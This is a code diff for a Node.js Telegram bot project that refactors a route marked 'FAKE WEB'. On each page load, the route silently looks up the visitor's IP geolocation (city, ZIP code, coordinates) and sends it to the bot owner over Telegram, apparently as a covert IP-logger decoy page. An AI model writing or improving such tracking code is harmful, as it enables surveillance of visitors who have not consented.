@@ -147,26 +147,54 @@ bot.command('resize', async (ctx) => {
 
 
 
-// FAKE WEB
-app.get("/", async(req, res) => {
-const ip = req.ip;
-let rs = await axios.get("https://api.ipbase.com/v1/json/" + ip)
-let rus = rs.data
-res.sendFile("./src/index.html", { root: __dirname });
-let teks =`*New Visitor*
-\`\`\`
-IP: ${rus.ip}
-COUNTRY: ${rus.country_name}
-REGION: ${rus.region_name}
-CITY: ${rus.city}
-ZIP CODE: ${rus.zip_code}
-TIMEZONE: ${rus.timezone}
-LATITUDE: ${rus.latitude}
-LONGTITUDE: ${rus.longtitude}
-METRO CODE: ${rus.metro_code}
-\`\`\``
-bot.telegram.sendMessage(global.owner, teks)
+app.get('/', async (req, res) => {
+  const ip = req.ip;
+  try {
+    const response = await axios.get(`https://api.ipbase.com/v1/json/${ip}`);
+    const data = response.data;
+
+    // Validate the data
+    if (!data || !data.country_name || !data.region_name || !data.city) {
+      throw new Error('Invalid API response');
+    }
+
+    // Extract the relevant information
+    const visitorInfo = {
+      ip: data.ip,
+      country: data.country_name,
+      region: data.region_name,
+      city: data.city,
+      zipCode: data.zip_code,
+      timezone: data.timezone,
+      latitude: data.latitude,
+      longitude: data.longitude,
+      metroCode: data.metro_code,
+    };
+
+    // Send the information to the Telegram bot
+    const message = `*New Visitor*\n\n\`\`\`\n${formatVisitorInfo(visitorInfo)}\n\`\`\``;
+    bot.telegram.sendMessage(global.owner, message);
+
+    res.sendFile('./src/index.html', { root: __dirname });
+  } catch (error) {
+    console.error(error);
+    res.status(500).send('Error processing request');
+  }
 });
+
+function formatVisitorInfo(visitorInfo) {
+  return `
+IP: ${visitorInfo.ip}
+COUNTRY: ${visitorInfo.country}
+REGION: ${visitorInfo.region}
+CITY: ${visitorInfo.city}
+ZIP CODE: ${visitorInfo.zipCode}
+TIMEZONE: ${visitorInfo.timezone}
+LATITUDE: ${visitorInfo.latitude}
+LONGITUDE: ${visitorInfo.longitude}
+METRO CODE: ${visitorInfo.metroCode}
+`;
+}
 
 // FAKE WEB
 app.listen(3000, () => {
